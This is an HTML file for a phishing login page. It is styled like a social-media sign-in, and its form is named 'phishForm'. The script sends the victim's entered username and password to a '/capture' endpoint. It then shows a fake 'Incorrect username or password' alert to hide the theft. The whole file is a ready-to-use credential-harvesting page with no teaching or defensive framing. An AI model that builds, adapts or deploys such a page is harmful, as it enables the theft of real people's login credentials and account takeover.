<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: white;
      padding: 40px 50px;
      border: 1px solid #ddd;
      border-radius: 10px;
      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }

    h2 {
      margin-bottom: 30px;
      color: #333;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
    }

    button:hover {
      background-color: #318ce7;
    }

    .note {
      margin-top: 15px;
      font-size: 12px;
      color: #999;
    }
    .top img{
        height: 80px;
        border-radius: 50%;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="top">
        <img src="1.png" alt="">
    </div>
    <h2>Login</h2>
    <form id="phishForm">
      <input type="text" id="username" placeholder="Username" required><br>
      <input type="password" id="password" placeholder="Password" required><br>
      <button type="submit">Log In</button>
    </form>
    <div class="note">This page is for authorized users only.</div>
  </div>

  <script>
    const form = document.getElementById("phishForm");
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      await fetch("/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
      });

      // Redirect or show fake error
      alert("Incorrect username or password.");
    });
  </script>
</body>
</html>
